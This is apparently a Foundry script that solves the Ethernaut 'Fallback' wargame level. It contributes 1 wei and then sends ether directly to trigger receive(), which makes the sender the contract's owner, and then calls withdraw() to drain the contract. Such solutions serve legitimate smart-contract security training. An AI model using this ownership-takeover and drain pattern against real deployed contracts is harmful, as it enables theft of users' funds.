// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import {Script,console} from "forge-std/Script.sol";
import "../src/Fallback.sol";

contract Solve is Script {
    Fallback public ethernaut1;
    address public addr = 0xc54306Af9614679DeAb34739DA5D75C22FDf6fDF;
    function run() external {
        vm.startBroadcast();
        console.log("msd.sender: " , msg.sender);
        ethernaut1 = Fallback(payable(addr));
        
        ethernaut1.contribute{value: 1 }();

        //trigger the receive() function
        (bool ok,) = address(ethernaut1).call{value : 1}("");
        require(ok, "transaction failed.");

        //checks if the owner changed to my address
        require(msg.sender == ethernaut1.owner(), "hack failed."); 
        ethernaut1.withdraw();

        vm.stopBroadcast();
    }
}

